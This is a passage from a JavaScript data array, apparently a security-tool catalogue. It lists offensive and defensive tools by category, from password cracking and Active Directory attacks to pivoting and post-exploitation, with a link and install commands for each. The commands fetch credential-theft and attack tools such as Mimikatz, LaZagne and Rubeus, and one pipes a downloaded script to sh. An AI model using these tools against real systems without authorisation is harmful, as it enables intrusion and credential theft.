        link: 'https://github.com/SamJoan/droopescan',
        linkLabel: 'GitHub',
        installation: ['pip3 install droopescan']
    },
    {
        name: 'Eyewitness',
        category: 'Web Testing',
        link: 'https://github.com/FortyNorthSecurity/EyeWitness',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/FortyNorthSecurity/EyeWitness.git', 'cd EyeWitness/Python/setup && ./setup.sh']
    },
    {
        name: 'Aquatone',
        category: 'Web Testing',
        link: 'https://github.com/michenriksen/aquatone',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/michenriksen/aquatone/releases/latest']
    },
    {
        name: 'Hakrawler',
        category: 'Web Testing',
        link: 'https://github.com/hakluke/hakrawler',
        linkLabel: 'GitHub',
        installation: ['go install github.com/hakluke/hakrawler@latest']
    },
    {
        name: 'GoSpider',
        category: 'Web Testing',
        link: 'https://github.com/jaeles-project/gospider',
        linkLabel: 'GitHub',
        installation: ['go install github.com/jaeles-project/gospider@latest']
    },
    {
        name: 'Corsy',
        category: 'Web Testing',
        link: 'https://github.com/s0md3v/Corsy',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/s0md3v/Corsy.git', 'cd Corsy && pip3 install -r requirements.txt']
    },
    {
        name: 'Tplmap',
        category: 'Web Testing',
        link: 'https://github.com/epinna/tplmap',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/epinna/tplmap.git']
    },
    {
        name: 'Sqlmate',
        category: 'Web Testing',
        link: 'https://github.com/UltimateHackers/sqlmate',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/UltimateHackers/sqlmate.git']
    },
    {
        name: 'GraphQLmap',
        category: 'Web Testing',
        link: 'https://github.com/swisskyrepo/GraphQLmap',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/swisskyrepo/GraphQLmap', 'cd GraphQLmap && pip3 install -r requirements.txt']
    },
    {
        name: 'CeWL',
        category: 'Web Testing',
        link: 'https://github.com/digininja/CeWL',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install cewl -y']
    },

    // ===== VULNERABILITY SCANNING =====
    {
        name: 'Nuclei',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/projectdiscovery/nuclei',
        linkLabel: 'GitHub',
        installation: ['go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest']
    },
    {
        name: 'OpenVAS',
        category: 'Vulnerability Scanning',
        link: 'https://www.openvas.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install openvas -y']
    },
    {
        name: 'Nessus',
        category: 'Vulnerability Scanning',
        link: 'https://www.tenable.com/products/nessus',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Trivy',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/aquasecurity/trivy',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install trivy -y']
    },
    {
        name: 'Lynis',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/CISOfy/lynis',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install lynis -y']
    },
    {
        name: 'Vuls',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/future-architect/vuls',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/future-architect/vuls/releases/latest']
    },
    {
        name: 'Nmap NSE Scripts',
        category: 'Vulnerability Scanning',
        link: 'https://nmap.org/nsedoc/',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install nmap -y']
    },
    {
        name: 'Retire.js',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/RetireJS/retire.js',
        linkLabel: 'GitHub',
        installation: ['npm install -g retire']
    },
    {
        name: 'Safety',
        category: 'Vulnerability Scanning',
        link: 'https://github.com/pyupio/safety',
        linkLabel: 'GitHub',
        installation: ['pip3 install safety']
    },

    // ===== EXPLOITATION =====
    {
        name: 'Metasploit',
        category: 'Exploitation',
        link: 'https://github.com/rapid7/metasploit-framework',
        linkLabel: 'GitHub',
        installation: ['curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sh']
    },
    {
        name: 'Exploit-DB Searchsploit',
        category: 'Exploitation',
        link: 'https://github.com/offensive-security/exploitdb',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install exploitdb -y']
    },
    {
        name: 'AutoSploit',
        category: 'Exploitation',
        link: 'https://github.com/NullArray/AutoSploit',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/NullArray/AutoSploit.git', 'cd AutoSploit && pip3 install -r requirements.txt']
    },
    {
        name: 'BeEF',
        category: 'Exploitation',
        link: 'https://github.com/beefproject/beef',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install beef-xss -y']
    },
    {
        name: 'Routersploit',
        category: 'Exploitation',
        link: 'https://github.com/threat9/routersploit',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/threat9/routersploit', 'cd routersploit && pip3 install -r requirements.txt']
    },
    {
        name: 'Commix',
        category: 'Exploitation',
        link: 'https://github.com/commixproject/commix',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install commix -y']
    },

    // ===== PASSWORD CRACKING =====
    {
        name: 'John the Ripper',
        category: 'Password Cracking',
        link: 'https://github.com/openwall/john',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install john -y']
    },
    {
        name: 'Hashcat',
        category: 'Password Cracking',
        link: 'https://github.com/hashcat/hashcat',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install hashcat -y']
    },
    {
        name: 'Hydra',
        category: 'Password Cracking',
        link: 'https://github.com/vanhauser-thc/thc-hydra',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install hydra -y']
    },
    {
        name: 'Medusa',
        category: 'Password Cracking',
        link: 'https://github.com/jmk-foofus/medusa',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install medusa -y']
    },
    {
        name: 'Patator',
        category: 'Password Cracking',
        link: 'https://github.com/lanjelot/patator',
        linkLabel: 'GitHub',
        installation: ['pip3 install patator']
    },
    {
        name: 'Ophcrack',
        category: 'Password Cracking',
        link: 'https://ophcrack.sourceforge.io',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install ophcrack -y']
    },
    {
        name: 'RainbowCrack',
        category: 'Password Cracking',
        link: 'http://project-rainbowcrack.com',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Hashid',
        category: 'Password Cracking',
        link: 'https://github.com/psypanda/hashID',
        linkLabel: 'GitHub',
        installation: ['pip3 install hashid']
    },
    {
        name: 'Haiti',
        category: 'Password Cracking',
        link: 'https://github.com/noraj/haiti',
        linkLabel: 'GitHub',
        installation: ['gem install haiti-hash']
    },
    {
        name: 'CrackStation',
        category: 'Password Cracking',
        link: 'https://crackstation.net',
        linkLabel: 'Website',
        installation: ['Online service']
    },
    {
        name: 'Hash-Buster',
        category: 'Password Cracking',
        link: 'https://github.com/s0md3v/Hash-Buster',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/s0md3v/Hash-Buster.git']
    },
    {
        name: 'BruteSpray',
        category: 'Password Cracking',
        link: 'https://github.com/x90skysn3k/brutespray',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/x90skysn3k/brutespray.git', 'cd brutespray && pip3 install -r requirements.txt']
    },
    {
        name: 'Crowbar',
        category: 'Password Cracking',
        link: 'https://github.com/galkan/crowbar',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/galkan/crowbar.git']
    },
    {
        name: 'Cain and Abel',
        category: 'Password Cracking',
        link: 'https://www.oxid.it/cain.html',
        linkLabel: 'Website',
        installation: ['Windows only']
    },

    // ===== ACTIVE DIRECTORY =====
    {
        name: 'BloodHound',
        category: 'Active Directory',
        link: 'https://github.com/BloodHoundAD/BloodHound',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install bloodhound -y']
    },
    {
        name: 'SharpHound',
        category: 'Active Directory',
        link: 'https://github.com/BloodHoundAD/SharpHound',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe']
    },
    {
        name: 'Impacket',
        category: 'Active Directory',
        link: 'https://github.com/fortra/impacket',
        linkLabel: 'GitHub',
        installation: ['python3 -m pip install impacket']
    },
    {
        name: 'CrackMapExec',
        category: 'Active Directory',
        link: 'https://github.com/byt3bl33d3r/CrackMapExec',
        linkLabel: 'GitHub',
        installation: ['pipx install crackmapexec']
    },
    {
        name: 'NetExec',
        category: 'Active Directory',
        link: 'https://github.com/Pennyw0rth/NetExec',
        linkLabel: 'GitHub',
        installation: ['pipx install git+https://github.com/Pennyw0rth/NetExec']
    },
    {
        name: 'Rubeus',
        category: 'Active Directory',
        link: 'https://github.com/GhostPack/Rubeus',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe']
    },
    {
        name: 'Mimikatz',
        category: 'Active Directory',
        link: 'https://github.com/gentilkiwi/mimikatz',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip', 'unzip mimikatz_trunk.zip']
    },
    {
        name: 'Kerbrute',
        category: 'Active Directory',
        link: 'https://github.com/ropnop/kerbrute',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64', 'chmod +x kerbrute_linux_amd64']
    },
    {
        name: 'Evil-WinRM',
        category: 'Active Directory',
        link: 'https://github.com/Hackplayers/evil-winrm',
        linkLabel: 'GitHub',
        installation: ['sudo gem install evil-winrm']
    },
    {
        name: 'PowerView',
        category: 'Active Directory',
        link: 'https://github.com/PowerShellMafia/PowerSploit',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/PowerShellMafia/PowerSploit.git']
    },
    {
        name: 'Invoke-Obfuscation',
        category: 'Active Directory',
        link: 'https://github.com/danielbohannon/Invoke-Obfuscation',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/danielbohannon/Invoke-Obfuscation.git']
    },
    {
        name: 'PowerUp',
        category: 'Active Directory',
        link: 'https://github.com/PowerShellMafia/PowerSploit',
        linkLabel: 'GitHub',
        installation: ['Part of PowerSploit']
    },
    {
        name: 'ADRecon',
        category: 'Active Directory',
        link: 'https://github.com/adrecon/ADRecon',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/adrecon/ADRecon.git']
    },
    {
        name: 'Covenant',
        category: 'Active Directory',
        link: 'https://github.com/cobbr/Covenant',
        linkLabel: 'GitHub',
        installation: ['git clone --recurse-submodules https://github.com/cobbr/Covenant']
    },
    {
        name: 'Empire',
        category: 'Active Directory',
        link: 'https://github.com/BC-SECURITY/Empire',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/BC-SECURITY/Empire.git', 'cd Empire && ./setup/install.sh']
    },
    {
        name: 'Pypykatz',
        category: 'Active Directory',
        link: 'https://github.com/skelsec/pypykatz',
        linkLabel: 'GitHub',
        installation: ['pip3 install pypykatz']
    },
    {
        name: 'Kerberoast',
        category: 'Active Directory',
        link: 'https://github.com/nidem/kerberoast',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/nidem/kerberoast.git']
    },
    {
        name: 'GetNPUsers',
        category: 'Active Directory',
        link: 'https://github.com/fortra/impacket',
        linkLabel: 'GitHub',
        installation: ['Part of Impacket']
    },
    {
        name: 'Certify',
        category: 'Active Directory',
        link: 'https://github.com/GhostPack/Certify',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe']
    },
    {
        name: 'Certipy',
        category: 'Active Directory',
        link: 'https://github.com/ly4k/Certipy',
        linkLabel: 'GitHub',
        installation: ['pip3 install certipy-ad']
    },
    {
        name: 'ADCSPwn',
        category: 'Active Directory',
        link: 'https://github.com/bats3c/ADCSPwn',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/bats3c/ADCSPwn.git']
    },
    {
        name: 'Coercer',
        category: 'Active Directory',
        link: 'https://github.com/p0dalirius/Coercer',
        linkLabel: 'GitHub',
        installation: ['pip3 install coercer']
    },
    {
        name: 'PetitPotam',
        category: 'Active Directory',
        link: 'https://github.com/topotam/PetitPotam',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/topotam/PetitPotam.git']
    },
    {
        name: 'PrinterBug',
        category: 'Active Directory',
        link: 'https://github.com/dirkjanm/krbrelayx',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/dirkjanm/krbrelayx.git']
    },
    {
        name: 'PassTheCert',
        category: 'Active Directory',
        link: 'https://github.com/AlmondOffSec/PassTheCert',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/AlmondOffSec/PassTheCert.git']
    },
    {
        name: 'SharpGPOAbuse',
        category: 'Active Directory',
        link: 'https://github.com/FSecureLABS/SharpGPOAbuse',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/FSecureLABS/SharpGPOAbuse.git']
    },
    {
        name: 'Whisker',
        category: 'Active Directory',
        link: 'https://github.com/eladshamir/Whisker',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/eladshamir/Whisker.git']
    },
    {
        name: 'PrivExchange',
        category: 'Active Directory',
        link: 'https://github.com/dirkjanm/PrivExchange',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/dirkjanm/PrivExchange.git']
    },
    {
        name: 'Ldapdomaindump',
        category: 'Active Directory',
        link: 'https://github.com/dirkjanm/ldapdomaindump',
        linkLabel: 'GitHub',
        installation: ['pip3 install ldapdomaindump']
    },
    {
        name: 'SharpChrome',
        category: 'Active Directory',
        link: 'https://github.com/GhostPack/SharpDPAPI',
        linkLabel: 'GitHub',
        installation: ['Part of SharpDPAPI']
    },

    // ===== POISONING =====
    {
        name: 'Responder',
        category: 'Poisoning',
        link: 'https://github.com/SpiderLabs/Responder',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install responder -y']
    },
    {
        name: 'Bettercap',
        category: 'Poisoning',
        link: 'https://github.com/bettercap/bettercap',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install bettercap -y']
    },
    {
        name: 'Ettercap',
        category: 'Poisoning',
        link: 'https://www.ettercap-project.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install ettercap-graphical -y']
    },
    {
        name: 'MITMproxy',
        category: 'Poisoning',
        link: 'https://github.com/mitmproxy/mitmproxy',
        linkLabel: 'GitHub',
        installation: ['pip3 install mitmproxy']
    },
    {
        name: 'ARPSpoof',
        category: 'Poisoning',
        link: 'https://github.com/alobbs/macchanger',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install dsniff -y']
    },
    {
        name: 'Inveigh',
        category: 'Poisoning',
        link: 'https://github.com/Kevin-Robertson/Inveigh',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/Kevin-Robertson/Inveigh.git']
    },
    {
        name: 'MITM6',
        category: 'Poisoning',
        link: 'https://github.com/dirkjanm/mitm6',
        linkLabel: 'GitHub',
        installation: ['pip3 install mitm6']
    },

    // ===== PRIVILEGE ESCALATION =====
    {
        name: 'linPEAS',
        category: 'Privilege Escalation',
        link: 'https://github.com/carlospolop/PEASS-ng',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'chmod +x linpeas.sh']
    },
    {
        name: 'winPEAS',
        category: 'Privilege Escalation',
        link: 'https://github.com/carlospolop/PEASS-ng',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe']
    },
    {
        name: 'Linux Smart Enumeration',
        category: 'Privilege Escalation',
        link: 'https://github.com/diego-treitos/linux-smart-enumeration',
        linkLabel: 'GitHub',
        installation: ['wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh', 'chmod +x lse.sh']
    },
    {
        name: 'LinEnum',
        category: 'Privilege Escalation',
        link: 'https://github.com/rebootuser/LinEnum',
        linkLabel: 'GitHub',
        installation: ['wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh', 'chmod +x LinEnum.sh']
    },
    {
        name: 'Windows Exploit Suggester',
        category: 'Privilege Escalation',
        link: 'https://github.com/AonCyberLabs/Windows-Exploit-Suggester',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git']
    },
    {
        name: 'PSPY',
        category: 'Privilege Escalation',
        link: 'https://github.com/DominicBreuker/pspy',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64']
    },
    {
        name: 'Linux Exploit Suggester',
        category: 'Privilege Escalation',
        link: 'https://github.com/mzet-/linux-exploit-suggester',
        linkLabel: 'GitHub',
        installation: ['wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh']
    },
    {
        name: 'BeRoot',
        category: 'Privilege Escalation',
        link: 'https://github.com/AlessandroZ/BeRoot',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/AlessandroZ/BeRoot.git']
    },
    {
        name: 'Unix-privesc-check',
        category: 'Privilege Escalation',
        link: 'https://github.com/pentestmonkey/unix-privesc-check',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/pentestmonkey/unix-privesc-check.git']
    },
    {
        name: 'GTFOBins',
        category: 'Privilege Escalation',
        link: 'https://gtfobins.github.io',
        linkLabel: 'Website',
        installation: ['Online resource']
    },
    {
        name: 'LOLBAS',
        category: 'Privilege Escalation',
        link: 'https://lolbas-project.github.io',
        linkLabel: 'Website',
        installation: ['Online resource']
    },
    {
        name: 'WinPwn',
        category: 'Privilege Escalation',
        link: 'https://github.com/S3cur3Th1sSh1t/WinPwn',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/S3cur3Th1sSh1t/WinPwn.git']
    },
    {
        name: 'JAWS',
        category: 'Privilege Escalation',
        link: 'https://github.com/411Hall/JAWS',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/411Hall/JAWS.git']
    },
    {
        name: 'PrivescCheck',
        category: 'Privilege Escalation',
        link: 'https://github.com/itm4n/PrivescCheck',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/itm4n/PrivescCheck.git']
    },
    {
        name: 'Watson',
        category: 'Privilege Escalation',
        link: 'https://github.com/rasta-mouse/Watson',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/rasta-mouse/Watson.git']
    },
    {
        name: 'Seatbelt',
        category: 'Privilege Escalation',
        link: 'https://github.com/GhostPack/Seatbelt',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe']
    },
    {
        name: 'SharpUp',
        category: 'Privilege Escalation',
        link: 'https://github.com/GhostPack/SharpUp',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe']
    },
    {
        name: 'Linux-Kernel-Exploits',
        category: 'Privilege Escalation',
        link: 'https://github.com/SecWiki/linux-kernel-exploits',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/SecWiki/linux-kernel-exploits.git']
    },
    {
        name: 'Windows-Kernel-Exploits',
        category: 'Privilege Escalation',
        link: 'https://github.com/SecWiki/windows-kernel-exploits',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/SecWiki/windows-kernel-exploits.git']
    },

    // ===== SMB =====
    {
        name: 'Enum4linux',
        category: 'SMB',
        link: 'https://github.com/CiscoCXSecurity/enum4linux',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install enum4linux -y']
    },
    {
        name: 'Enum4linux-ng',
        category: 'SMB',
        link: 'https://github.com/cddmp/enum4linux-ng',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/cddmp/enum4linux-ng.git', 'cd enum4linux-ng && pip3 install -r requirements.txt']
    },
    {
        name: 'SMBMap',
        category: 'SMB',
        link: 'https://github.com/ShawnDEvans/smbmap',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install smbmap -y']
    },
    {
        name: 'SMBClient',
        category: 'SMB',
        link: 'https://www.samba.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install smbclient -y']
    },
    {
        name: 'RPCClient',
        category: 'SMB',
        link: 'https://www.samba.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install samba-common-bin -y']
    },
    {
        name: 'Nullinux',
        category: 'SMB',
        link: 'https://github.com/m8sec/nullinux',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/m8sec/nullinux.git', 'cd nullinux && bash setup.sh']
    },
    {
        name: 'Polenum',
        category: 'SMB',
        link: 'https://github.com/Wh1t3Fox/polenum',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/Wh1t3Fox/polenum.git']
    },
    {
        name: 'NBTScan',
        category: 'SMB',
        link: 'http://www.unixwiz.net/tools/nbtscan.html',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install nbtscan -y']
    },

    // ===== NETWORK ANALYSIS =====
    {
        name: 'Wireshark',
        category: 'Network Analysis',
        link: 'https://www.wireshark.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install wireshark -y']
    },
    {
        name: 'tcpdump',
        category: 'Network Analysis',
        link: 'https://www.tcpdump.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install tcpdump -y']
    },
    {
        name: 'tshark',
        category: 'Network Analysis',
        link: 'https://www.wireshark.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install tshark -y']
    },
    {
        name: 'NetworkMiner',
        category: 'Network Analysis',
        link: 'https://www.netresec.com/?page=NetworkMiner',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Zeek',
        category: 'Network Analysis',
        link: 'https://zeek.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install zeek -y']
    },
    {
        name: 'Snort',
        category: 'Network Analysis',
        link: 'https://www.snort.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install snort -y']
    },
    {
        name: 'Suricata',
        category: 'Network Analysis',
        link: 'https://suricata.io',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install suricata -y']
    },

    // ===== WIRELESS =====
    {
        name: 'Aircrack-ng',
        category: 'Wireless',
        link: 'https://www.aircrack-ng.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install aircrack-ng -y']
    },
    {
        name: 'Reaver',
        category: 'Wireless',
        link: 'https://github.com/t6x/reaver-wps-fork-t6x',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install reaver -y']
    },
    {
        name: 'Wifite',
        category: 'Wireless',
        link: 'https://github.com/derv82/wifite2',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install wifite -y']
    },
    {
        name: 'Kismet',
        category: 'Wireless',
        link: 'https://www.kismetwireless.net',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install kismet -y']
    },
    {
        name: 'Fern Wifi Cracker',
        category: 'Wireless',
        link: 'https://github.com/savio-code/fern-wifi-cracker',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install fern-wifi-cracker -y']
    },
    {
        name: 'WiFi-Pumpkin',
        category: 'Wireless',
        link: 'https://github.com/P0cL4bs/wifipumpkin3',
        linkLabel: 'GitHub',
        installation: ['pip3 install wifipumpkin3']
    },
    {
        name: 'Pixiewps',
        category: 'Wireless',
        link: 'https://github.com/wiire-a/pixiewps',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install pixiewps -y']
    },
    {
        name: 'Cowpatty',
        category: 'Wireless',
        link: 'https://github.com/joswr1ght/cowpatty',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install cowpatty -y']
    },
    {
        name: 'Wash',
        category: 'Wireless',
        link: 'https://github.com/t6x/reaver-wps-fork-t6x',
        linkLabel: 'GitHub',
        installation: ['Part of Reaver']
    },
    {
        name: 'Wifiphisher',
        category: 'Wireless',
        link: 'https://github.com/wifiphisher/wifiphisher',
        linkLabel: 'GitHub',
        installation: ['pip3 install wifiphisher']
    },
    {
        name: 'Airgeddon',
        category: 'Wireless',
        link: 'https://github.com/v1s1t0r1sh3r3/airgeddon',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git']
    },
    {
        name: 'Fluxion',
        category: 'Wireless',
        link: 'https://github.com/FluxionNetwork/fluxion',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/FluxionNetwork/fluxion.git']
    },

    // ===== PIVOTING =====
    {
        name: 'Chisel',
        category: 'Pivoting',
        link: 'https://github.com/jpillora/chisel',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_linux_amd64.gz', 'gunzip chisel_1.9.1_linux_amd64.gz && chmod +x chisel_1.9.1_linux_amd64']
    },
    {
        name: 'Ligolo-ng',
        category: 'Pivoting',
        link: 'https://github.com/nicocha30/ligolo-ng',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/nicocha30/ligolo-ng/releases/latest']
    },
    {
        name: 'Proxychains',
        category: 'Pivoting',
        link: 'https://github.com/haad/proxychains',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install proxychains4 -y']
    },
    {
        name: 'Socat',
        category: 'Pivoting',
        link: 'http://www.dest-unreach.org/socat',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install socat -y']
    },
    {
        name: 'SSHuttle',
        category: 'Pivoting',
        link: 'https://github.com/sshuttle/sshuttle',
        linkLabel: 'GitHub',
        installation: ['pip3 install sshuttle']
    },
    {
        name: 'Metasploit Autoroute',
        category: 'Pivoting',
        link: 'https://github.com/rapid7/metasploit-framework',
        linkLabel: 'GitHub',
        installation: ['Part of Metasploit']
    },
    {
        name: 'Rpivot',
        category: 'Pivoting',
        link: 'https://github.com/klsecservices/rpivot',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/klsecservices/rpivot.git']
    },
    {
        name: 'Plink',
        category: 'Pivoting',
        link: 'https://www.chiark.greenend.org.uk/~sgtatham/putty/',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Tunna',
        category: 'Pivoting',
        link: 'https://github.com/SECFORCE/Tunna',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/SECFORCE/Tunna.git']
    },
    {
        name: 'reGeorg',
        category: 'Pivoting',
        link: 'https://github.com/sensepost/reGeorg',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/sensepost/reGeorg.git']
    },
    {
        name: 'Neo-reGeorg',
        category: 'Pivoting',
        link: 'https://github.com/L-codes/Neo-reGeorg',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/L-codes/Neo-reGeorg.git']
    },

    // ===== POST EXPLOITATION =====
    {
        name: 'GTFOBLookup',
        category: 'Post Exploitation',
        link: 'https://github.com/nccgroup/GTFOBLookup',
        linkLabel: 'GitHub',
        installation: ['pip3 install gtfoblookup']
    },
    {
        name: 'LaZagne',
        category: 'Post Exploitation',
        link: 'https://github.com/AlessandroZ/LaZagne',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/AlessandroZ/LaZagne.git']
    },
    {
        name: 'SessionGopher',
        category: 'Post Exploitation',
        link: 'https://github.com/Arvanaghi/SessionGopher',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/Arvanaghi/SessionGopher.git']
    },
    {
        name: 'SharpDPAPI',
        category: 'Post Exploitation',
        link: 'https://github.com/GhostPack/SharpDPAPI',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe']
    },
    {
        name: 'SharpCollection',
        category: 'Post Exploitation',
        link: 'https://github.com/Flangvik/SharpCollection',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/Flangvik/SharpCollection.git']
    },
    {
        name: 'SharpHound',
        category: 'Post Exploitation',
        link: 'https://github.com/BloodHoundAD/SharpHound',
        linkLabel: 'GitHub',
        installation: ['wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe']
    },
    {
        name: 'Inveigh',
        category: 'Post Exploitation',
        link: 'https://github.com/Kevin-Robertson/Inveigh',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/Kevin-Robertson/Inveigh.git']
    },
    {
        name: 'PSExec',
        category: 'Post Exploitation',
        link: 'https://docs.microsoft.com/en-us/sysinternals/downloads/psexec',
        linkLabel: 'Website',
        installation: ['Download from Microsoft']
    },
    {
        name: 'WCE',
        category: 'Post Exploitation',
        link: 'https://www.ampliasecurity.com/research/windows-credentials-editor/',
        linkLabel: 'Website',
        installation: ['Download from website']
    },

    // ===== REVERSE ENGINEERING =====
    {
        name: 'Ghidra',
        category: 'Reverse Engineering',
        link: 'https://ghidra-sre.org',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'IDA Pro',
        category: 'Reverse Engineering',
        link: 'https://hex-rays.com/ida-pro/',
        linkLabel: 'Website',
        installation: ['Commercial - download from website']
    },
    {
        name: 'Radare2',
        category: 'Reverse Engineering',
        link: 'https://github.com/radareorg/radare2',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/radareorg/radare2 && cd radare2 && sys/install.sh']
    },
    {
        name: 'Binary Ninja',
        category: 'Reverse Engineering',
        link: 'https://binary.ninja',
        linkLabel: 'Website',
        installation: ['Commercial - download from website']
    },
    {
        name: 'OllyDbg',
        category: 'Reverse Engineering',
